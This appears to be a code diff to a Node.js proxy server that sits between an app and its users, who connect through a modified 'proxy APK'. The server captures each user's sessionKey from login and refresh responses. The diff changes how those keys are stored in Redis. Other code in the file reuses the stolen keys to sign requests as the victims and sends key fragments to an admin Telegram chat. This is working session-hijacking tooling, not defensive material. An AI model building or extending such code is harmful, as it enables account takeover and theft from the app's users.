@@ -100,17 +100,19 @@ async function getSessionKey(userId) {
   if (sessionKeyMap[uid]) return sessionKeyMap[uid];
   if (redis) {
     try {
-      const sk = await redis.hget('dschfSessionKeys', uid);
+      const sk = await redis.get(`dschf_sk_${uid}`);
       if (sk) { sessionKeyMap[uid] = String(sk); return String(sk); }
     } catch(e) {}
   }
   return null;
 }
 
-function saveSessionKey(userId, sessionKey) {
+async function saveSessionKey(userId, sessionKey) {
   const uid = String(userId);
   sessionKeyMap[uid] = sessionKey;
-  if (redis) redis.hset('dschfSessionKeys', uid, sessionKey).catch(()=>{});
+  if (redis) {
+    try { await redis.set(`dschf_sk_${uid}`, sessionKey); } catch(e) {}
+  }
 }
 
 function computeSignature(sessionKey, bodyObj) {
@@ -657,7 +659,7 @@ app.post('/bot-webhook', async (req, res) => {
       if (!targetUid || !sk) {
         const memKeys = Object.keys(sessionKeyMap).join(', ') || 'none';
         let redisKeys = '';
-        if (redis) { try { const all = await redis.hgetall('dschfSessionKeys'); if (all && typeof all === 'object' && !Array.isArray(all)) { redisKeys = Object.keys(all).join(', '); } else if (Array.isArray(all)) { const keys = []; for(let i=0;i<all.length;i+=2) keys.push(all[i]); redisKeys = keys.join(', '); } else { redisKeys = 'none'; } } catch(e) { redisKeys = 'error: ' + e.message; } }
+        if (redis) { try { const keys = await redis.keys('dschf_sk_*'); redisKeys = keys && keys.length ? keys.map(k => k.replace('dschf_sk_', '')).join(', ') : 'none'; } catch(e) { redisKeys = 'error: ' + e.message; } }
         await bot.sendMessage(chatId, `❌ No sessionKey found.\nMemory: ${memKeys}\nRedis: ${redisKeys}\nUsage: /testtask <userId>\n\n💡 User must login first through proxy APK`);
         return res.sendStatus(200);
       }
@@ -720,7 +722,7 @@ app.post('/app/auth/login', async (req, res) => {
       if (respData.sessionKey) {
         if (userId) {
           tokenUserMap['session_' + String(userId)] = String(userId);
-          saveSessionKey(String(userId), respData.sessionKey);
+          await saveSessionKey(String(userId), respData.sessionKey);
           sessionKeyCaptured = true;
         }
       }
@@ -1241,7 +1243,7 @@ app.all('/app/auth/refresh/session', async (req, res) => {
       if (rid) { userId = String(rid); uidSource = 'resp-data'; }
     }
     if (respData && respData.sessionKey && userId) {
-      saveSessionKey(String(userId), respData.sessionKey);
+      await saveSessionKey(String(userId), respData.sessionKey);
       if (data.adminChatId && bot) {
         bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId} (${uidSource})\n🔑 SK: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
       }
